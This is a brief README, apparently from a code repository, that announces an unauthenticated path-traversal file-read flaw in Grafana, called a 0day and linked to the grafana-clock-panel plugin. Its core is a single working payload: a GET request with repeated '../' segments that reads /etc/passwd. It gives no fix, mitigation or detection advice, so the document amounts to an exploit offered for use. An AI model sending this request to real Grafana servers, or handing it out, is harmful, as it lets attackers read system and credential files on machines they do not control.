# grafana-unauth-file-read

Unauthorized reading of files in Grafana (0day)

It looks like the new 0day LFI in Grafana exists thanks to the grafana-clock-panel plugin. It is enough to send a GET request of the form:

```GET /public/plugins/grafana-clock-panel/../../../../../../../etc/passwd```

### Follow us


